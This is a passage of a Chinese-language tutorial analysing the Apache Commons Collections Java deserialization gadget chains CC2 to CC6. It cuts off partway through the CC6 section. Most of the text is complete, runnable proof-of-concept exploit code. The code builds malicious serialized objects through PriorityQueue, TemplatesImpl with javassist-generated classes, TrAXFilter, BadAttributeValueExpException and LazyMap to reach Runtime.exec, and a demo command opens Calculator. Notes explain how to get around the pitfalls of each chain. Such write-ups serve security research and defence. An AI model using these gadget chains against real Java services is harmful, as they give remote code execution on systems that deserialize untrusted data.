            while (k < half) {
                int child = (k << 1) + 1;
                Object c = queue[child];
                int right = child + 1;
                if (right < size &&
                    comparator.compare((E) c, (E) queue[right]) > 0)
                    c = queue[child = right];
                if (comparator.compare(x, (E) c) <= 0)
                    break;
                queue[k] = c;
                k = child;
            }
            queue[k] = x;
        }

重点：

    
    
    comparator.compare(x, (E) c)

这里的x是我们可控的，cc2中使用了TransformingComparator#compare来触发后续链，看一下这个方法：

![-w562](https://images.seebug.org/content/images/2020/06/11/1591853426000-31stixm.png-w331s)

可以发现，这里对this.transformer调用了transform方法，如果这个this.transformer可控的话，就可以触发cc1中的后半段链。

![-w906](https://images.seebug.org/content/images/2020/06/11/1591853426000-32iwklv.png-w331s)

从上图可以看出，this.transformer并没有被static或transient修饰，所以是我们可控的。

构造POC：

    
    
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    public class cc2 {
    
        public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
    
            TransformingComparator comparator = new TransformingComparator(chain);
            PriorityQueue queue = new PriorityQueue(1);
    
            queue.add(1);
            queue.add(2);
    
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(queue,comparator);
    
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
                outputStream.writeObject(queue);
                outputStream.close();
    
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
    
        }
    
    
    }

这个poc延用了cc1的后半段链，直接在最后触发了ChainedTransformer#transform方法导致rce。但是cc2在yso中的poc并不是这个，而是用到了一个新的点TemplatesImpl。

  * 一些细节的问题

1.为什么这里要put两个值进去?

![-w719](https://images.seebug.org/content/images/2020/06/11/1591853426000-33yuyse.png-w331s)

这里往queue中put两个值，是为了让其size>1，只有size>1才能使的i>0，才能进入siftDown这个方法中，完成后面的链。

2.这里为什么要在add之后才通过反射修改comparator的值?

![-w368](https://images.seebug.org/content/images/2020/06/11/1591853426000-34klnep.png-w331s)

add调用了offer方法：

![-w480](https://images.seebug.org/content/images/2020/06/11/1591853426000-35qinjq.png-w331s)

offer方法中调用了siftUp方法：

![-w465](https://images.seebug.org/content/images/2020/06/11/1591853426000-36rgleo.png-w331s)

这里需要保证comparator的值为null，才能够正常的添加元素进queue，如果我们在add之前使comparator为我们构造好的TransformingComparator，就会报这么一个错误：

![-w1159](https://images.seebug.org/content/images/2020/06/11/1591853427000-37sqffq.png-w331s)

我们回过头来看看javassit：

    
    
    import javassist.*;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    
    public class javassit_test {
        public static void createPseson() throws Exception {
    
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.makeClass("Cat");
            String cmd = "System.out.println(\"evil code\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            // 写入.class 文件
            cc.writeFile();
        }
    
        public static void main(String[] args) {
            try {
                createPseson();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

上面这段代码中生成的class是这样的：

![-w442](https://images.seebug.org/content/images/2020/06/11/1591853427000-38hhzgk.png-w331s)

这里的static语句块会在创建类实例的时候执行。

回到TemplatesImpl这个类中：

![-w781](https://images.seebug.org/content/images/2020/06/11/1591853427000-39ztsyr.png-w331s)

在其newTransformer中调用了getTransletInstance方法：

![-w811](https://images.seebug.org/content/images/2020/06/11/1591853427000-40zjssf.png-w331s)

重点代码即我圈起来的两行代码，首先先跟进defineTransletClasses方法：

![-w682](https://images.seebug.org/content/images/2020/06/11/1591853427000-41pphpv.png-w331s)

这里通过loader.defineClass的方式将bytecodes还原为Class，接着在外面又调用了_class[_transletIndex].newInstance方法实例化还原的Class。此时static语句块成功执行。

也就是说，我们可以通过TemplatesImpl#newTransformer方法来执行恶意类的static语句块。

Demo：

    
    
    import javassist.*;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import java.lang.ClassLoader;
    import java.lang.reflect.Field;
    
    public class javassit_test {
        public static void createPseson() throws Exception {
    
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name" + System.nanoTime());
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
    
        }
    
        public static void main(String[] args) {
            try {
                createPseson();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
    
        public static Field getField(final Class<?> clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    
    }

![-w1239](https://images.seebug.org/content/images/2020/06/11/1591853428000-42fffzl.png-w331s)

此时已经可以成功执行命令了，接下来就是需要找到一个点调用了newTransformer这个方法。

前面说了，我们已经可以执行到transform方法了，那么我们可以通过InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，达到命令执行的目的。

完整POC：

    
    
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.util.PriorityQueue;
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    public class cc2 {
    
        public static void main(String[] args) throws Exception {
            Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
            constructor.setAccessible(true);
            InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");
    
            TransformingComparator comparator = new TransformingComparator(transformer);
            PriorityQueue queue = new PriorityQueue(1);
    
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name");
            setFieldValue(templates, "_class", null);
    
            Object[] queue_array = new Object[]{templates,1};
    
            Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
            queue_field.setAccessible(true);
            queue_field.set(queue,queue_array);
    
            Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
            size.setAccessible(true);
            size.set(queue,2);
    
    
            Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            comparator_field.setAccessible(true);
            comparator_field.set(queue,comparator);
    
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
                outputStream.writeObject(queue);
                outputStream.close();
    
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
    
        }
    
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
    
        public static Field getField(final Class<?> clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    
    
    }

  * 一些细节问题

这里我从poc的上半段到下半段，把一些细节问题梳理一下。

1.为什么要设置恶意类的父类为AbstractTranslet?

这是因为在defineTransletClasses这个方法中存在一个判断：

![-w847](https://images.seebug.org/content/images/2020/06/11/1591853428000-43ovatk.png-w331s)

我们需要令_transletIndex为i，此时的i为0，默认状态下_transletIndex的值为-1，而如果_transletIndex的值小于0，就会抛出异常：

![-w647](https://images.seebug.org/content/images/2020/06/11/1591853428000-44awpwl.png-w331s)

这里我们也不能通过反射的方式来设置_transletIndex的值，因为还是会进入到_auxClasses方法中，此方法会报出错误，我们依旧无法正常的序列化。

2.为什么要设置_name、_class、两个属性，其值对应的意义是什么？

首先如果要进入defineTransletClasses，需要满足这两个条件：

![-w541](https://images.seebug.org/content/images/2020/06/11/1591853428000-45cszab.png-w331s)

所以_name需要设置为任意不为null的值，而_class需要设置为null。

3.为什么要通过反射的方式来设置queue的值，而不能直接add？

这是因为在put的时候会将后一个元素与前一个元素进行比较，而templates是一个类，他和数字1无法进行比较，所以这里会报错。同样的，如果传入一个对象和另外一个对象，两者也无法进行比较，都会报出如下错误：

![-w1275](https://images.seebug.org/content/images/2020/06/11/1591853429000-46pztbn.png-w331s)

所以需要通过反射的方式来对queue的值进行设置。

4.为什么要修改queue数组的第一个值为TemplatesImpl?

是因为在调用compare方法的时候，传递了一个obj1进去：

![-w514](https://images.seebug.org/content/images/2020/06/11/1591853429000-47jhrrl.png-w331s)

通过cc1的学习我们知道，InvokerTransformer调用方法是基于你传递进来的类来进行调用的，所以这里的obj1需要设置为TemplatesImpl，而这个obj1是从这里来的：

![-w632](https://images.seebug.org/content/images/2020/06/11/1591853429000-48qffxb.png-w331s)

所以我们需要控制这个c，而这个c是从queue中取出来的，所以在这里我们需要设置queue中第一个值为TemplatesImpl，为什么不能设置为第二个呢？是因为调用compare时，会先对第一个进行调用，如果我们设置TemplatesImpl在第二个位置，则会报出1没有newTransformer方法的错误：

![-w1201](https://images.seebug.org/content/images/2020/06/11/1591853429000-49pelpn.png-w331s)

5.为什么要通过反射的方式修改size?

这个在前面说过了，size必须要大于2，而我们这里并没有调用put方法，所以size默认是为0的，当然还有一种办法，就是先调用两次put，put正常的值进，再修改queue数组，这两种办法的实现原理是一样的。

### 我认为的利用链

    
    
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            PriorityQueue.heapify()
                PriorityQueue.siftDown()
                    PriorityQueue.siftDownUsingComparator()
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                    Method.invoke()
                                        TemplatesImpl.newTransformer()
                                             TemplatesImpl.getTransletInstance()
                                             TemplatesImpl.defineTransletClasses
                                             newInstance()
                                                Runtime.exec()

## Commons Collections 3

利用环境：

  * jdk1.7
  * Commons Collections 3.1

### 利用链

    
    
    ObjectInputStream.readObject()
                AnnotationInvocationHandler.readObject()
                    Map(Proxy).entrySet()
                        AnnotationInvocationHandler.invoke()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InstantiateTransformer.transform()
                                newInstance()
                                    TrAXFilter#TrAXFilter()
                                    TemplatesImpl.newTransformer()
                                             TemplatesImpl.getTransletInstance()
                                             TemplatesImpl.defineTransletClasses
                                             newInstance()
                                                Runtime.exec()

### 利用链分析

cc3更像是cc1+cc2的结合体，然后稍微变种了一下。。

cc2里说了，我们需要通过TemplatesImpl#newTransformer来实现命令执行，在cc2里使用的是InvokerTransformer来反射调用newTransformer。而cc3中则是通过TrAXFilter这个类的构造方法来调用newTransformer。

![-w753](https://images.seebug.org/content/images/2020/06/11/1591853429000-50rzaxm.png-w331s)

在cc3中引入了一个新的InstantiateTransformer，以下是他的transform方法：

![-w799](https://images.seebug.org/content/images/2020/06/11/1591853430000-51whzxw.png-w331s)

可以发现这里创建了类实例，如果我们把input设置为TrAXFilter，那么就会在这里实例化的时候调用其构造方法，触发TemplatesImpl#newTransformer。

构造POC：

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    
    import javax.xml.transform.Templates;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    
    
    public class cc3 {
    
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name");
            setFieldValue(templates, "_class", null);
    
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
            });
    
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
    
    
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
    
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
    
    
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
    
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc3"));
                outputStream.writeObject(handler);
                outputStream.close();
    
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc3"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
    
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
    
        public static Field getField(final Class<?> clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }

这个poc看起来应该就不会有前面那么费劲了，因为cc3实际上就只是cc1和cc2的杂交变种。相当于cc1的前半段链结合cc3的后半段链，中间transformer这里稍微改了一下触发方式而已。

## Commons Collections 4

测试环境：

  * jdk1.7
  * Commons Collections 4.0

### 利用链

    
    
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            PriorityQueue.heapify()
                PriorityQueue.siftDown()
                    PriorityQueue.siftDownUsingComparator()
                        TransformingComparator.compare()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InstantiateTransformer.transform()
                                newInstance()
                                    TrAXFilter#TrAXFilter()
                                    TemplatesImpl.newTransformer()
                                             TemplatesImpl.getTransletInstance()
                                             TemplatesImpl.defineTransletClasses
                                             newInstance()
                                                Runtime.exec()

### 利用链分析

cc4也没什么新的东西，实际上算是cc2和cc3的杂交体。。

cc3前半段用的是cc1的，在cc4里稍微改了一下，前半段换成cc2的了。。

POC：

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import javassist.*;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    
    public class cc4 {
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name");
            setFieldValue(templates, "_class", null);
    
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
            });
    
            Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
            constructor.setAccessible(true);
            InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");
    
            TransformingComparator comparator = new TransformingComparator(transformer);
            PriorityQueue queue = new PriorityQueue(1);
    
            Object[] queue_array = new Object[]{templates,1};
    
            Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
            queue_field.setAccessible(true);
            queue_field.set(queue,queue_array);
    
            Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
            size.setAccessible(true);
            size.set(queue,2);
    
    
            Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            comparator_field.setAccessible(true);
            comparator_field.set(queue,comparator);
    
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
                outputStream.writeObject(queue);
                outputStream.close();
    
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
    
        public static Field getField(final Class<?> clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }

## Commons Collections 5

测试环境：

  * jdk 1.7
  * Commons Collections 3.1

### 利用链

    
    
    /*
        Gadget chain:
            ObjectInputStream.readObject()
                BadAttributeValueExpException.readObject()
                    TiedMapEntry.toString()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
        Requires:
            commons-collections
     */
    /*
    This only works in JDK 8u76 and WITHOUT a security manager
    https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
     */

### 利用链分析

cc5的后半段与cc1相同，所以先把cc1的内容抄下来：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.util.HashMap;
    
    public class cc5 {
        public static void main(String[] args){
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        }
    }

在cc1中说了，这里只要调用LazyMap#get并且传递任意内容即可触发后续的链达到rce的目的。

在cc5中用到的是TiedMapEntry中的toString方法：

    
    
    public String toString() {
            return this.getKey() + "=" + this.getValue();
        }

跟进getValue方法：

    
    
        public V getValue() {
            return this.map.get(this.key);
        }

可以发现这里对this.map调用了get方法，并将key传递进去，所以这里只需要令map为我们前面构造好的LazyMap，即可触发rce。

![-w413](https://images.seebug.org/content/images/2020/06/11/1591853430000-52bgykv.png-w331s)

从上图中的定义可以发现，map以及key都是我们可控的，构造POC：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    
    import java.util.HashMap;
    
    public class cc5 {
        public static void main(String[] args){
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
            TiedMapEntry tiedmap = new TiedMapEntry(map,123);
            tiedmap.toString();
        }
    }

上面的代码即可实现任意命令执行，接下来我们需要找哪里调用了toString方法，在cc5中使用了BadAttributeValueExpException这个类。

BadAttributeValueExpException#readObject：

![-w755](https://images.seebug.org/content/images/2020/06/11/1591853430000-53trqom.png-w331s)

看看这个valObj是从哪里来的：

![-w806](https://images.seebug.org/content/images/2020/06/11/1591853430000-54iyfav.png-w331s)

不难发现，这里是从Filed中取出来的，那么利用方式也就很清晰了，通过反射来设置BadAttributeValueExpException中val的值为TiedMapEntry即可触发命令执行。

POC：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    
    import javax.management.BadAttributeValueExpException;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    
    public class cc5 {
        public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
            TiedMapEntry tiedmap = new TiedMapEntry(map,123);
            BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
            Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
            val.setAccessible(true);
            val.set(poc,tiedmap);
    
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));
                outputStream.writeObject(poc);
                outputStream.close();
    
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }

下面解释一些细节的问题：

  * 为什么创建BadAttributeValueExpException实例时不直接将构造好的TiedMapEntry传进去而要通过反射来修改val的值？

以下为BadAttributeValueExpException的构造方法：

    
    
    public BadAttributeValueExpException (Object val) {
            this.val = val == null ? null : val.toString();
        }

可以发现，如果我们直接将前面构造好的TiedMapEntry传进去，在这里就会触发toString，从而导致rce。此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry。否则就会报出下边的错误：

![-w877](https://images.seebug.org/content/images/2020/06/11/1591853430000-55tcbnu.png-w331s)

## Commons Collections 6

测试环境：

  * jdk 1.7
  * Commons Collections 3.1

### 利用链

    
    
        Gadget chain:
            java.io.ObjectInputStream.readObject()
                java.util.HashSet.readObject()
                    java.util.HashMap.put()
                    java.util.HashMap.hash()
                        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                        org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                            org.apache.commons.collections.map.LazyMap.get()
                                org.apache.commons.collections.functors.ChainedTransformer.transform()
                                ...
                                org.apache.commons.collections.functors.InvokerTransformer.transform()
                                java.lang.reflect.Method.invoke()
                                    java.lang.Runtime.exec()
        by @matthias_kaiser
    */

### 利用链分析

cc6的后半段链也和cc1是一样的，老规矩，我们先把cc1后半段的payload抄下来：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.util.HashMap;
    
    public class cc6 {
    
        public static void main(String[] args){
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
